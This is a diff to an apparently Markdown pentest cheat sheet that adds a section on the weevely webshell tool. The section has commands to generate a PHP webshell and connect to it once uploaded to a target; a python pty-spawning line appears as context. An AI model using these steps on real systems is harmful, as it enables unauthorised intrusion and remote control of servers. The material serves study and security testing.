@@ -4,6 +4,7 @@
 *  [SQL inj to webshell](#sql-inj-to-webshell)  
 *  [Don't delete my webshell](#dont-delete-my-webshell)  
 *  [Reverse shell](#reverse-shell)  
+*  [weevely shell](#weevely-shell)  
 *  [Privilege escalation](#privilege-escalation)  
 *  [Reference](#reference)
 
@@ -173,6 +174,19 @@ python -c "import pty;pty.spawn('/bin/bash')"
 
 reference from [安全客](https://www.anquanke.com/post/id/87017)  
 reference from [你和目标只差一个shell的距离](https://klionsec.github.io/2016/09/27/revese-shell/)  
+
+# weevely shell
+We can use weevely shell in kali system. Its advantage is difficulty for others to get its private key, and its disadvantage is slow because it need to run on php.  
+```php
+// in kali
+weevely generate password shell.php
+
+// after you upload your shell.php
+// connect
+weevely http://example.com/shell.php password
+```  
+Additionally, you can many modules on it.  
+[Reference to epinna/weevely3](https://github.com/epinna/weevely3)  
 
 # Privilege escalation    
 1. escalate with kernel exploit  
